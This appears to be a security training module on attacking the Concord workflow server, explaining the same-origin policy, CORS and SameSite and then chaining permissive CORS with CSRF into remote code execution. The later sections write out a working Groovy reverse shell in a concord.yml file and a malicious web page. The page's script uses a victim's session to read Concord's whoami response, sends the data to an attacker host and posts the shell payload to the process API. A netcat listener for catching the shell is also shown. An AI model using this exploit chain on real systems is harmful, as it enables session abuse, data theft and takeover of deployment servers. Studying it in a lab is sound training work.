Given the complexity of modern web applications, modern development teams rely on automated deployment practices to streamline application build, test, and deployment workflows. In this environment, a workflow server (also called a continuous deployment [server](https://www.atlassian.com/continuous-delivery/continuous-deployment) or orchestration hub) can automate development workflows, execute required build or deployment commands, and invoke various required APIs. This practice improves the speed, agility, and accuracy of the deployment process.

However, because the workflow server at the core of the environment must be granted access to code in development, test, and production environments, it becomes a primary target for attackers.

In this module, we will target Concord, an open-source workflow server developed by Walmart. We will discover that Concord contains three authentication bypass vulnerabilities.
The first vulnerability was discovered by Rob Fitzpatrick, who identified an information disclosure issue related to permissive Cross-Origin Resource Sharing (CORS) headers.
The second vulnerability is a Cross-Site Request Forgery (CSRF) vulnerability discovered by Offensive Security.
The third vulnerability (also discovered by Offensive Security) abuses default user accounts, which attackers can access using undisclosed API keys.

This module will examine all three vulnerabilities, beginning with the CORS issue. We will use a gray-box testing approach, meaning that we can access the documentation but will not inspect the source code. While looking for a viable attack path, we will discover a CSRF vulnerability and use these issues to achieve remote code execution (RCE).

Finally, we will review the source code (using a white-box approach) to discover the default-user vulnerability, and we will once again use it to achieve remote code execution.


# 8.1 Getting Started

Let us first understand the target application. While browsing the application, we will refer to [various parts of the documentation.](https://concord.walmartlabs.com/docs/index.html)

To access the Concord server, we created a hosts file entry named "concord" on the Kali Linux VM.

```shell
kali@kali:~$ sudo mousepad /etc/hosts

kali@kali:~$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

192.168.50.132  concord
191.168.50.253  debugger
```

Please adjust the corresponding IP addresses on your Kali machine so you can follow along. Before you begin, make sure to reset the Concord virtual machine from the _Labs_ page. The Concord VM credentials are shown below.

|URL|Username|Password|
|---|---|---|
|http://concord:8001/|||
|ssh://concord|student|studentlab|

Later in this module, we will also use the debugger VM, which provides a user activity simulator that can visit any page we provide. The simulator contains a user who is already authenticated to Concord. We can also start this VM from the _Labs_ page.

The Concord application is running on port 8001. Let us use the Chromium browser built into Burp Suite to navigate to the page.

![[Pasted image 20260725063931.png]]

The home page immediately prompts for a username and password. Other than the "Login" button, there are no obvious links on the page. We try a default directory scan to discover other routes and files.
``` shell
kali@kali:~$ dirb http://concord:8001

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Apr  1 16:15:44 2021
URL_BASE: http://concord:8001/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://concord:8001/ ----
+ http://concord:8001/api (CODE:401|SIZE:0)
==> DIRECTORY: http://concord:8001/docs/
+ http://concord:8001/forms (CODE:401|SIZE:0)
==> DIRECTORY: http://concord:8001/images/
+ http://concord:8001/index.html (CODE:200|SIZE:2166)
+ http://concord:8001/logs (CODE:401|SIZE:0)
==> DIRECTORY: http://concord:8001/static/

---- Entering directory: http://concord:8001/docs/ ----
+ http://concord:8001/docs/index.html (CODE:200|SIZE:3589)

---- Entering directory: http://concord:8001/images/ ----

---- Entering directory: http://concord:8001/static/ ----
==> DIRECTORY: http://concord:8001/static/css/
==> DIRECTORY: http://concord:8001/static/js/
==> DIRECTORY: http://concord:8001/static/media/

---- Entering directory: http://concord:8001/static/css/ ----

---- Entering directory: http://concord:8001/static/js/ ----

---- Entering directory: http://concord:8001/static/media/ ----

-----------------
END_TIME: Thu Apr  1 16:56:42 2021
DOWNLOADED: 32284 - FOUND: 5
```

Aside from the document root and static resources (CSS, JS, and media files), all discovered routes return an unauthorized error (401). Applications like this usually expose very little to unauthenticated users. Let us look at the HTTP history tab in Burp Suite to better understand the application.

![[Pasted image 20260725064457.png]]

The initial page load issued eight requests.
- The request for `cfg.js` loads configuration information pointing to the Concord documentation and the GitHub code repository.
- The request for `images` loads the logo.
- The request for `static/media` loads fonts.
![[Pasted image 20260725064617.png]]

All of these are fairly standard. However, the `/api/service/console/whoami` API request (which returned an unauthorized response) looks interesting.
![[Pasted image 20260725064830.png]]

Based on the route name, we can infer that this request returns information about the authenticated user. Since we have not yet authenticated, the response does not contain any user data. However, the headers beginning with `Access-Control` deserve attention. These headers tell the browser which origins are allowed to access specific resources.


# 8.2 Authentication Bypass: Round One  CSRF and CORS

When we discover that the target application returns CORS headers, we should investigate them, because overly permissive headers can create vulnerabilities. For example, we can create a payload on a malicious website that forces visitors to request data from a vulnerable site. If the victim has already authenticated to the target website, our malicious site may be able to steal user data from the target site or perform malicious requests, depending on the actual CORS configuration. This happens because, by default, most browsers are configured to send cookies, including session cookies, along with requests to the target website.

By default, most browsers attempt to protect users from this kind of attack in several ways. However, a misconfigured website may weaken those protections, making the site vulnerable to this type of attack.

This attack is considered a _Cross-Site Request Forgery_ ([CSRF](https://owasp.org/www-community/attacks/csrf)) or session-hijacking attack. In a CSRF attack, the attacker performs actions in the name of the victim. If the victim is already authenticated, those actions will be accepted as authenticated as well. CSRF is not a new concept. However, when combined with overly permissive CORS settings, we gain much more flexibility in both the types of requests we can send and the types of data we can retrieve.

To properly describe CORS and CSRF attacks, we first need to discuss browser protection mechanisms.

Unlike other headers that can improve application security, CORS headers reduce application security by relaxing the Same-Origin Policy (SOP), which is intended to prevent cross-site communication.

## 8.2.1 Same-Origin Policy (SOP)

Browsers enforce SOP to prevent one origin from accessing resources belonging to another origin. An origin is defined by its scheme, hostname, and port number. Resources can include images, HTML, data, JSON, and so on.

Suppose `https://a.com/latest` needs to access multiple resources in order to load the page. Some resources may reside under the same domain but on different paths, while others may be under entirely different domains. Not all of these resources will load successfully.

The table below lists some example resources, indicates whether they will load, and explains why:

| URL                         | Result  | Reason                    |
| --------------------------- | ------- | ------------------------- |
| https://a.com/myInfo        | Allowed | Same Origin               |
| **http:**//a.com/users.json | Blocked | Different Scheme and Port |
| https://**api**.a.com/info  | Blocked | Different Domain          |
| https://a.com:8443/files    | Blocked | Different Port            |
| https://**b**.com/analytics | Blocked | Different Domain          |

The purpose of SOP is not to stop the browser from sending resource requests, but to prevent JavaScript from reading the responses. All requests in the table above will still be sent, but the JavaScript running on `https://a.com/latest` will not be able to read responses marked as "Blocked."

Images, iframes, and other resources are still allowed because, although SOP does not allow the JavaScript engine to access the response content, it does allow those resources to be loaded into the page.

This is similar to the `HttpOnly` cookie flag, which prevents JavaScript from accessing a cookie while still allowing the browser to send it with HTTP requests.

For example, on the `Concord` page and in the `Chromium JavaScript` console, we can use the configuration file previously found in `cfg.js` to request a same-origin resource.
Use `fetch` to send an HTTP GET request and then read the response.
```
fetch("http://concord:8001/cfg.js")
	.then(function (response) {
		return response.text()
	})
	.then(function (text) {
		console.log(text)
	})
```

To run this code, press Ctrl + Shift + Return to open the Chromium developer console, then go to the Console tab.

![[Pasted image 20260725071654.png]]
The request succeeds, and JavaScript can read the response, as shown by the console log.

Next, we try the following request to access a resource on another origin:
```
fetch("http://example.com")
   .then(function (response) {
   	return response.text();
   })
   .then(function (text) {
   	console.log(text);
   })
```

![[Pasted image 20260725071807.png]]

This time, the console throws an error indicating that the request was blocked. However, we can still find the request and response in Burp Suite.

![[Pasted image 20260725071825.png]]

The response contains content, but the browser prevents us, and JavaScript, from accessing the data.

Given the information above, it is tempting to think that we could simply add an image to a website, set its source to the GET request we want to send, and then read the image contents to bypass SOP. For example, suppose we want to access the email address of an authenticated user. We could place an image on a website we control with the URL `http://email.com/latestMessage`. When the browser loads the page, it sends a request to `http://email.com/latestMessage`, loads the user’s latest message, and places the email contents into an "image." Of course, that "image" would be invalid because it contains email data, but surely JavaScript should still be able to read it, right? Wrong. Because the "image" is loaded from a different origin, SOP prevents JavaScript from accessing its contents. For more details, see [Same-Origin Policy.](https://portswigger.net/web-security/cors/same-origin-policy)

Developers may legitimately need to access resources on different origins. For example, a [single-page application](https://en.wikipedia.org/wiki/Single-page_application) (`https://a.com`) may need to access data via an API (`https://api.a.com`). To support this, the Cross-Origin Resource Sharing (CORS) specification was introduced, allowing developers to relax SOP restrictions.



## 8.2.2 Cross-Origin Resource Sharing (CORS)

In simple terms, CORS uses request and response headers to tell the browser which origins may access server resources. For example, to allow `https://a.com` to load data from `https://api.a.com`, the API endpoint must include CORS headers that permit the `https://a.com` origin.

Let us look at the following sample HTTP response:
```
HTTP/1.1 200 OK
Cache-Control: no-cache
Access-Control-Allow-Origin: https://a.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: cache-control,content-language,expires,last-modified,content-range,content-length,accept-ranges
Cache-Control: no-cache
Content-Type: application/json
Vary: Accept-Encoding
Connection: close
Content-Length: 15

{"status":"ok"}
```

CORS headers begin with `Access-Control`. Although not every one of these headers is required for cross-origin communication, this example shows some common CORS [headers.](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#cors) Let us review them one by one:

- **Access-Control-Allow-Origin**: Describes which origins may access the response.
- **Access-Control-Allow-Credentials**: Indicates whether the request may include credentials (cookies).
- **Access-Control-Expose-Headers**: Indicates which headers the browser should expose to JavaScript.

The most important of these is `Access-Control-Allow-Origin` (Listing 5), which specifies that the origin `https://a.com` may access resources on this host.

As discussed earlier, SOP does not prevent requests from being sent; it prevents responses from being read. There are, however, exceptions. Some requests require an HTTP _preflight_ [request](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request)

(sent using the `OPTIONS` method) to determine whether the browser may send the actual follow-up request. Standard `GET`, `HEAD`, and `POST` requests do not require a preflight request. However, other request methods, requests containing custom HTTP headers, or `POST` requests with non-standard content types do require one.

We will demonstrate this again using the JavaScript console. All requests will be proxied through Burp Suite.

First, we send a `POST` request using a standard `Content-Type` header. We will send the request to `example.com` without caring about the response.
```
fetch("https://example.com",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/x-www-form-urlencoded;"
   	}
   })
```
We run this command again in the developer console.

![[Pasted image 20260725073045.png]]

As expected, the response is blocked by SOP, but if we inspect the request in Burp Suite, we can see that the `POST` request was in fact sent.
![[Pasted image 20260725073104.png]]

Next, we change the content type to a non-standard value, meaning anything other than `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`.
```
fetch("https://example.com",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/json;"
   	}
   })
```

![[Pasted image 20260725073203.png]]

The request is blocked again. However, if we inspect the request, we discover that it is not a `POST` request.

![[Pasted image 20260725073224.png]]

This is a preflight `OPTIONS` request. In this request, the client (the browser) attempts to send a `POST` request with a custom content-type header. Because the server does not respond with appropriate CORS headers, SOP blocks the request.

Now let us send a request to a website that is configured with CORS headers. For that purpose, we use `httpbin.org`, a website intended specifically for testing CORS headers.
```
fetch("https://httpbin.org/anything",
   {
   	method: 'post',
   	headers: {
   		"Content-type": "application/json;"
   	}
   })
```

![[Pasted image 20260725073301.png]]

This time, the command does not throw an error.

![[Pasted image 20260725073325.png]]

Again, the initial request is an `OPTIONS` request, indicating that we are trying to send a `POST` request with a custom content-type header. This time, the response contains multiple CORS headers that allow our origin, our custom headers, `POST` requests, tell the browser to cache the CORS configuration for 0 seconds, and allow credentials (cookies).

After receiving this preflight response, we find the actual `POST` request we attempted to send.

![[Pasted image 20260725073332.png]]
This time, the actual `POST` request is sent with the custom `Content-Type`.

Understanding these concepts is critical so that we know which requests will actually send data and which will not. The exact situation often determines what we need. For example, if we only need to send a request and do not care about receiving the response, such as when changing state without collecting data, we have many options. But if we need to receive the response or collect data or resources from the target, our options are more limited because the target must return more permissive headers.

From a security perspective, the most important headers when analyzing a target application for CORS issues are `Access-Control-Allow-Origin` and `Access-Control-Allow-Credentials`. `Access-Control-Allow-Credentials` only accepts the value `true`, and its default value is `false`. If this header is set to `true`, any request that is sent will include the cookies set by the website. That means the browser will automatically authenticate the request.

Only origins listed in `Access-Control-Allow-Origin` are allowed to read the resource. This header can be set to one of three values: `*`, an `origin`, or `null`. If it is set to the wildcard `*`, then all origins are allowed to read resources from the remote server. This may look like the vulnerable configuration we want, but that setting requires `Access-Control-Allow-Credentials` to be `false`, which means all requests will be unauthenticated. If the header is set to a specific origin value, then only that origin may read the resource; if `Access-Control-Allow-Credentials` is also `true`, cookies will be included as well.

In a secure environment, `Access-Control-Allow-Origin` should be set only to trusted origins. That means a malicious site we control would not be able to send HTTP requests on behalf of a user and read the response.

Unfortunately, `Access-Control-Allow-Origin` only allows a site to specify a single origin. It cannot contain wildcards like `*.a.com` or lists like `a.com, b.com, c.com`. As a result, developers came up with a clever, but unsafe, workaround: dynamically setting `Access-Control-Allow-Origin` to the request origin, allowing multiple origins to send requests with cookies.

We can see this on the `https://httpbin.org/anything` site we visited earlier:
![[Pasted image 20260725073941.png]]

The value in the `Origin` header is set to the browser’s origin (`http://concord:8001`). Browsers automatically set this header for all [JavaScript-initiated CORS requests.](https://fetch.spec.whatwg.org/#cors-request) The response includes that same origin in `Access-Control-Allow-Origin` and also allows cookies to be sent with the request. This mechanism tells us that the CORS test site allows requests, including cookies, from any origin. However, this is only useful if the target hosts sensitive data worth stealing or an API we can interact with maliciously. Unfortunately, our test site provides neither.


## 8.2.3 Discovering Unsafe CORS Headers

Returning to the Concord application, we right-click the `/api/service/console/whoami` request and select "Send to Repeater" so the request is sent to Repeater. Once it arrives there, we send the original request and inspect the response.

![[Pasted image 20260725074232.png]]

The `GET` request to `/api/service/console/whoami` does not include an `Origin` header. That is because it is a same-origin `GET` request, meaning it is not a CORS request. The response contains the header `Access-Control-Allow-Origin: *`. As we discussed earlier, this indicates that the browser will not send cookies in cross-origin requests.

If the application requires authentication, then it must implement some form of session management. If it implements session management, then there must also be some way to send the session identifier along with requests.

Let us try adding an `Origin` header to the request and analyze the response.
![[Pasted image 20260725074441.png]]

The server not only copies the origin into the `Access-Control-Allow-Origin` header, but also adds the `Access-Control-Allow-Credentials` header and sets it to `true`.

However, each endpoint and each HTTP method can have different CORS headers depending on which actions are allowed or denied. Since we know that all non-standard `GET` and `POST` requests first send an `OPTIONS` request to determine whether the actual request is permitted, let us change the method to `OPTIONS` and look at the response.

![[Pasted image 20260725074550.png]]

When we send an `OPTIONS` request, the `Origin` header is not copied into the `Access-Control-Allow-Origin` header. Unfortunately, that means the CORS vulnerability has a limited scope. We can only read the responses to `GET` requests and standard `POST` requests.

To understand what we can and cannot do with this, we should examine another control that can stop the browser from sending cookies: the [_SameSite_](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite) attribute.


## 8.2.4 The SameSite Attribute

As discussed earlier, making a user’s browser send a request is not difficult. The difficult part is getting the browser to send the request with the user’s session cookie and then being able to use the response. To understand how cookies behave in this context, we need to discuss the optional `SameSite` attribute of the `Set-Cookie` HTTP header.

Let us inspect an HTTP response to see where the `SameSite` attribute might appear.
```
HTTP/1.1 200 OK
Connection: close
Date: Thu, 01 Apr 2021 20:53:24 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: application/javascript
Set-Cookie: session=ABCDEFGHIJKLMNO; Path=/; Max-Age=0; SameSite=Lax;
Content-Length: 316
```

This attribute can appear anywhere within the `Set-Cookie` header. Attributes are separated by semicolons.

This attribute defines whether a cookie is restricted to the same-site context. It has three possible values: _Strict_, _None_, and _Lax_.

If a cookie’s `SameSite` attribute is set to _Strict_ (`SameSite=Strict`), the browser will send the cookie only when the user is actively browsing the same site. For example, if a site like **funnycatpictures.com** uses a cookie to track which cat pictures a user has viewed, that cookie will be sent when the user browses pages within **funnycatpictures.com**. But if an image from **funnycatpictures.com** is embedded on another website, the cookie will not be included in the request. Likewise, if the user clicks a link to **funnycatpictures.com** from another site, the cookie will not be sent with that request either. The same restriction applies if **funnycatpictures.com** is loaded inside an iframe on another site.

When `SameSite` is set to `None`, the browser will send the cookie in all contexts, including page navigation, image loads, and iframe loads. The `None` value requires the `Secure` [attribute](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#attributes), ensuring that the cookie is sent only over HTTPS.

Finally, the `Lax` value means that the cookie will be sent across different websites only for certain requests. For the browser to include the cookie, the request must satisfy the following two requirements:
1. It must use a method that does not make changes on the server ([GET, HEAD, OPTIONS](https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP)).
2. It must originate from a user-initiated navigation (also called a top-level navigation). For example, clicking a link will include cookies, but a request made by an image or script will not.

_SameSite_ is a relatively new browser feature and is still not universally implemented. If a site does not set the _SameSite_ attribute, the default behavior varies by browser type and version.

Starting with Chrome 80 and Edge 86, cookies that do not specify `SameSite` default to `Lax`. At the time of writing, Firefox and Safari default to `None`. Like many other browser security features, Internet Explorer does not support `SameSite` at all.

Returning to our previous scenario, we should look for this attribute in cookies sent by Concord, but so far we have not received any cookies. In many cases, an application only sets cookies when a user authenticates or attempts to authenticate. Let us try logging in, find the request in Burp Suite, and observe the response.

![[Pasted image 20260725075719.png]]

When we submit the login request, a `whoami` request is also sent, but this time the username and password are included in the `Authorization` header using Base64 encoding. The response includes a cookie. This is likely not the session cookie, but it still does not set the `SameSite` attribute.

_Given the presence of the login page and the `Access-Control-Allow-Credentials` header_, we can infer that Concord uses cookies for session management. Since only about 10% of cookies include the _SameSite_ [attribute](https://dev.to/httparchive/samesite-cookies-are-you-ready-5abd), we assume that Concord does not set it.

Depending on the browser the user is using, the default fallback value may be _None_ or _Lax_.

When the browser’s default is _None_, users who visit a malicious page may be vulnerable to CSRF. As discussed earlier, when _SameSite_ is set to _None_, the browser sends cookies in all contexts, such as image loads, top-level navigation, and so on. In that situation, one website can send a request to another domain and the browser will include the user’s cookies. If the victim web application does not implement additional protections, a CSRF attack becomes possible.

Developers can also choose to mitigate CSRF issues using [_CSRF tokens_](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#token-based-mitigation).

CSRF tokens must be included in requests that change state. The token proves that the user loaded the page and submitted the request intentionally. In practice, CSRF tokens are often misconfigured, reused, or rotated too infrequently. In addition, if a site is vulnerable to permissive CORS headers, we may be able to extract a CSRF token by requesting the page that embeds it.

Understanding the relationship between SOP, CORS, and the `SameSite` attribute is essential to understanding how and when an application may be vulnerable to CSRF.

In our scenario, we learned that the Concord target server is configured with some permissive CORS headers. We also did not find any CSRF tokens. Combining that information with the status of `SameSite`, we suspect that a CSRF vulnerability may be exploitable. To perform a CSRF attack, we need a target user and an endpoint that lets us extract useful information or perform a privileged action.

We will review the Concord files to determine what we can and cannot do with the information we currently have.



## 8.2.5 Exploiting Permissive CORS and CSRF

Now that we have discussed the relationship between the various mitigations and confirmed that CORS headers are enabled in a permissive way, we can focus on exploitation. Exploiting a CORS issue is similar to exploiting reflected _Cross-Site Scripting_ (XSS): in both cases, we need to send a link to an authenticated user in order to abuse valuable functionality. The difference is that, in a CORS exploit, the link we send is not on the same domain as the target website. Because Concord enables some permissive CORS headers, any website visited by an authenticated user can interact with Concord and abuse the user’s session. As we discovered earlier, only `GET` requests and some `POST` requests work correctly against Concord.

To exploit the CORS issue, we must host our own website for the user to visit. Our site will contain JavaScript that runs in the victim’s browser and interacts with Concord. In a real-world scenario, we might create a blog containing Concord-related content to entice the victim into visiting it.

Before building the site, we must first identify a payload that can either elevate privileges or retrieve sensitive information. Since we cannot log in to Concord and inspect its functionality directly, we need to rely on the documentation.

Fortunately, the [documentation](https://concord.walmartlabs.com/docs/api/) for the Concord API is fairly detailed. Since browsers commonly rely on CORS headers to communicate with APIs, this is an excellent place to begin our research.

Because Concord imposes some constraints on CORS headers, we need to be selective about the kinds of requests we look for. While reading the documentation, we will search for `GET` requests that allow us to retrieve sensitive information such as secrets or API keys, `GET` requests that change the state of the application, or `POST` requests that use only standard content types.

One section that immediately stands out is [API Keys](https://concord.walmartlabs.com/docs/api/apikey.html). It describes an endpoint for "creating a new API key for a user."
![[Pasted image 20260725080241.png]]

This request uses `application/json` and is sent as a `POST` request. Unfortunately, that will not work for us because the browser will send an `OPTIONS` request before the `POST`. As we learned earlier, Concord responds to `OPTIONS` requests with a different, more secure CORS configuration. So we continue looking for alternatives.

The next endpoint, labeled "List existing API keys,"
![[Pasted image 20260725080402.png]]

is a `GET` request, so it should not require an `OPTIONS` request. However, on closer inspection, the API "only returns metadata, not the actual key." Although we know we can send this request and read the response, it does not give us anything more useful than what we already have.

As we continue reviewing the API documentation, we see that the `GET` endpoints appear to provide only information disclosure and may not increase our level of access. Eventually, however, in the "Process" section, we find an interesting statement:

A process is the execution of a flow within a project repository.

If we can start a process, we may be able to execute commands. Let us see what type of request is required.
![[Pasted image 20260725080451.png]]

This request uses the `POST` method with the content type `multipart/form-data`. According to Mozilla, the `multipart/form-data` content type does not require a preflight [request.](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) The Concord documentation also states that we can use the `Authorization` header. The authentication documentation shows that the `Authorization` header can be used for API keys [and API tokens](https://concord.walmartlabs.com/docs/getting-started/security.html#using-api-tokens) in curl requests. This same header was also used in the login request.

Although a site can authenticate requests using only the `Authorization` header, most modern browser-based graphical applications rely on cookies for authentication. That is a reasonable assumption here because Concord supports multiple authentication methods, and the browser must authenticate API calls somehow. In addition, since the server returns the `Access-Control-Allow-Credentials` header, we can assume that cookies are used for session management.

Let us continue reviewing the process API call to determine what else we may need to exploit Concord.

Later in the documentation, we find text describing how to start a Concord process by uploading a ZIP archive:
![[Pasted image 20260725080721.png]]

The documentation explains how to create a zip archive containing a `concord.yml` file, which itself contains a "flow." We will cover flow documentation in more detail shortly, but for now, let us look at the example curl request.

This curl command sends a request to `/api/v1/process` and uses the `-F` flag to specify the ZIP upload. Let us look at the curl help output to get more information about this flag.
```
kali@kali:~$ curl --help all
Usage: curl [options...] <url>
     --abstract-unix-socket <path> Connect via abstract Unix domain socket
     --alt-svc <file name> Enable alt-svc with this cache file
     --anyauth       Pick any authentication method
 -a, --append        Append to target file when uploading
...
 -F, --form <name=content> Specify multipart MIME data
     --form-string <name=string> Specify multipart MIME data
 ...
```

According to curl, the `-F` flag specifies multipart data.

From this, we conclude that we can start a process by sending a request to `/api/v1/process` containing a ZIP file or data that includes a file named `concord.yml`.

If we continue digging through the documentation, we discover that we do not even need to provide a ZIP file; a `concord.yml` file alone is enough.
![[Pasted image 20260725080922.png]]

Next, let us review the process documentation to look for a path to code execution.

The [Directory Structure](https://concord.walmartlabs.com/docs/processes-v1/index.html#directory-structure) section defines the `concord.yml` file:
- `concord.yml`: a Concord DSL file containing the main flow, configuration, profiles, and other declarations;

In Concord, the DSL file defines various configuration blocks, flows, and [profiles.](https://concord.walmartlabs.com/docs/processes-v1/index.html#dsl) The earlier documentation mentioned that the uploaded file must contain a flow. Let us review the part of the documentation related to flows:
![[Pasted image 20260725080955.png]]

Concord describes a flow as "a sequence of steps performing various actions." That sounds like a perfect command-execution vector. Let us determine how to make Concord execute system commands.

We can find an example of code execution in the [Scripting](https://concord.walmartlabs.com/docs/getting-started/scripting.html) section of the documentation. We will use the Groovy example to build our payload.
![[Pasted image 20260725081021.png]]

The documentation states that we must first import the Groovy dependency:
```
configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
```

Next, because the documentation states that we must provide at least one flow, we set the `script` variable to `groovy` (as shown in the example) to tell Concord to execute the body as Groovy code.
```
configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
```

After setting that up, we need to add a body containing the script. We will use a [_YML HereDoc_](https://lzone.de/cheat-sheet/YAML#yaml-heredoc-multiline-strings) so that we do not have to place everything on one line. We will use a common Groovy reverse shell as the script and format it for [readability.](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- A HereDoc (Here Document) is a **multiline string syntax** used in many languages such as Shell, Groovy, Ruby, and Perl.

```
configuration:
  dependencies:
  - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.2"
flows:
  default:
    - script: groovy
      body: |
         String host = "192.168.118.2";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
```

This will become the `concord.yml` file that we send to the server. We save this payload for later use. Next, we need to build a delivery mechanism. As mentioned earlier, we will create a website to send this payload. We will start with a blank HTML page containing a single `script` tag.
```
<html>
	<head>
		<script>
		</script>
	</head>
	<body>
	</body>
</html>
```

Next, we need to add JavaScript inside the `script` tag to send the API call that delivers the `concord.yml` payload. Before that, we will send a `whoami` request to determine whether the user is logged in. This is not strictly required, but it improves attack reliability, reduces noise, and gives us useful information.
``` js
<script>
	fetch("http://concord:8001/api/service/console/whoami", {
		credentials: 'include'
	})
	.then(async (response) => {
		if(response.status != 401){
			let data = await response.text();
			fetch("http://192.168.118.2/?msg=" + data )
		}else{
			fetch("http://192.168.118.2/?msg=UserNotLoggedIn" )
		}
	})
</script>
```

This code first sends a request with credentials (cookies) to the target server and target endpoint. If the response status is not `401`, the captured data is sent back to our server. If the response status is `401`, a message is sent to our Kali server instead.

Let us save this as `~/concord/index.html` and start a Python HTTP server on port 80.
```
kali@kali:~$ mkdir concord

kali@kali:~$ cd concord/

kali@kali:~/concord$ mousepad index.html

kali@kali:~/concord$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Next, we use Firefox to visit this page and verify that it works. Since we are not logged in to Concord yet, the `else` branch should be triggered and the message `UserNotLoggedIn` should be returned.
![[Pasted image 20260725081607.png]]

When we inspect the Python HTTP server log, we see that the `UserNotLoggedIn` message was indeed received.
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET / HTTP/1.1" 200 -
192.168.118.2 - - [07/Apr/2021 19:35:30] code 404, message File not found
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET /favicon.ico HTTP/1.1" 404 -
192.168.118.2 - - [07/Apr/2021 19:35:30] "GET /?msg=UserNotLoggedIn HTTP/1.1" 200 -
```

Using the provided Kali debugger VM, we can access a user activity simulator that visits any page we provide. The simulator contains a user who is already authenticated to Concord. If we have not already started the debugger VM, we need to do so now from the _Labs_ page. We will use this simulator to test our current payload and confirm that it works.

To connect, we use RDP to reach the Kali debugger and then browse to `http://simulator`. We enter Kali’s IP address and click _Simulate_.
```
xfreerdp3 /cert:ignore /compression /dynamic-resolution /u:student /p:studentlab /v:debugger
```

After the simulation completes, we check the HTTP server log again.
```
192.168.121.253 - - [07/Apr/2021 19:48:44] "GET / HTTP/1.1" 200 -
192.168.121.253 - - [07/Apr/2021 19:48:45] "GET /?msg={%20%20%22realm%22%20:%20%22apikey%22,%20%20%22username%22%20:%20%22concordAgent%22,%20%20%22displayName%22%20:%20%22concordAgent%22} HTTP/1.1" 200 -
```

As expected, the CORS payload worked. When an authenticated user visited the page, our malicious site was able to send a request to Concord and include the user’s credentials. Let us decode the message to see what information we were able to collect.
```
{
	"realm": "apikey",
	"username": "concordAgent",
	"displayName": "concordAgent"
}
```

It appears that we successfully phished the `concordAgent` user. Next, we will attempt to execute code by sending the `concord.yml` file we created earlier. First, we define the YAML content at the beginning of the HTML file’s `script` tag. To make later payload editing easier, we use a template string. Note that YAML is highly sensitive to whitespace, so we cannot add extra tabs merely to make the document look cleaner.
```
   <script>
        yml = `
configuration:
  dependencies:
    - "mvn://org.codehaus.groovy:groovy-all:pom:2.5.8"

flows:
  default:
    - script: groovy
      body: |
         String host = "192.168.118.2";
         int port = 9000;
         String cmd = "/bin/sh";
         Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
         Socket s = new Socket(host, port);
         InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
         OutputStream po = p.getOutputStream(), so = s.getOutputStream();
         while (!s.isClosed()) {
         while (pi.available() > 0) so.write(pi.read());
         while (pe.available() > 0) so.write(pe.read());
         while (si.available() > 0) po.write(si.read());
         so.flush();
         po.flush();
         Thread.sleep(50);
         try {
            p.exitValue();
            break;
         } catch (Exception e) {}
         };
         p.destroy();
         s.close();
`

      fetch("http://concord:8001/api/service/console/whoami", {
         credentials: 'include'
      })
...
   </script>
```

Next, we define a function at the end of the `script` tag that will post the `concord.yml` file.
```
function rce() {
   var ymlBlob = new Blob([yml], { type: "application/yml" });
   var fd = new FormData();
   fd.append('concord.yml', ymlBlob);
   fetch("http://concord:8001/api/v1/process", {
      // FIXME
      body: fd
   })
   .then(response => response.text())
   .then(data => {
      fetch("http://192.168.118.2/?msg=" + data )
   }).catch(err => {
      fetch("http://192.168.118.2/?err=" + err )
   });
}
```

First, we create a Blob from the `yml` string with the content type `application/yml`. This does not change the request’s overall `Content-Type` header, but it defines the content type of the file part inside the `fetch` form data. Next, we create the form data and attach the `concord.yml` document to it. After that, we use `fetch` to send the request and capture both responses and errors.

Finally, we need to edit the previously sent login-check request so that it runs the `rce` function after the user is confirmed to be authenticated.
```
...
	fetch("http://concord:8001/api/service/console/whoami", {
		credentials: 'include'
	})
	.then(async (response) => {
		if(response.status != 401){
			let data = await response.text();
			fetch("http://192.168.118.2/?msg=" + data );
			rce();
		}else{
			fetch("http://192.168.118.2/?msg=UserNotLoggedIn" );
		}
	})
...
```

Now that the payload is ready, we need to open a netcat listener to catch the shell. This should match the settings configured in the payload, including port `9000`.
```
kali@kali:~$ nc -nvlp 9000
listening on [any] 9000 ...
```

